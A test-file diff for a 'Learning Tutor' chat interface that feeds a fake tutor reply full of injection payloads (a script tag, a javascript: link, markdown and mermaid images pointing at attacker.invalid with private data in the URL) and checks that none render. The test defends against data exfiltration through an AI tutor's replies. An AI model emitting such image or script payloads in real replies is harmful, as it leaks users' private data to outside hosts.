@@ -66,7 +66,17 @@ describe("Learning Tutor visual state contracts", () => {
     const fake = learningFake();
     const turn = learningReceipt({ ...refreshRequest, kind: "turn", content: "Interest" });
     if (turn.output) {
-      turn.output.reply = "<script>alert(1)</script> [bad](javascript:alert(1))";
+      turn.output.reply = [
+        "<script>alert(1)</script> [bad](javascript:alert(1))",
+        "![Private diagram](https://attacker.invalid/pixel?focus=private-focus)",
+        "![Reference image][tracking]",
+        "[tracking]: //attacker.invalid/pixel?history=private-history",
+        "[Read more](https://example.com/learning)",
+        "```mermaid",
+        "flowchart TD",
+        '  A@{ img: "https://attacker.invalid/diagram?focus=private-focus", label: "Private diagram" }',
+        "```",
+      ].join("\n\n");
       turn.output.existing_work = [
         { kind: "beat", supplied_target_key: "beat:11111111-1111-4111-8111-111111111111" },
       ];
@@ -79,6 +89,22 @@ describe("Learning Tutor visual state contracts", () => {
     await screen.findByTestId("learning-turn");
     expect(container.querySelector("script")).toBeNull();
     expect(container.querySelector('a[href^="javascript:"]')).toBeNull();
+    const renderedTurn = screen.getByTestId("learning-turn");
+    expect(renderedTurn.querySelector("img, svg, image, iframe, object, embed")).toBeNull();
+    expect(renderedTurn.querySelector('[data-testid="mermaid-diagram"]')).toBeNull();
+    expect(renderedTurn).toHaveTextContent("Private diagram");
+    expect(renderedTurn).toHaveTextContent("Reference image");
+    expect(renderedTurn.querySelector("pre code")).toHaveTextContent(
+      'A@{ img: "https://attacker.invalid/diagram?focus=private-focus"',
+    );
+    expect(screen.getByRole("link", { name: "Read more" })).toHaveAttribute(
+      "href",
+      "https://example.com/learning",
+    );
+    expect(screen.getByRole("link", { name: "Read more" })).toHaveAttribute(
+      "rel",
+      "noopener noreferrer",
+    );
     expect(screen.queryByText("Explore Beat")).toBeNull();
     expect(screen.queryByText("Open Beat")).toBeNull();
   });
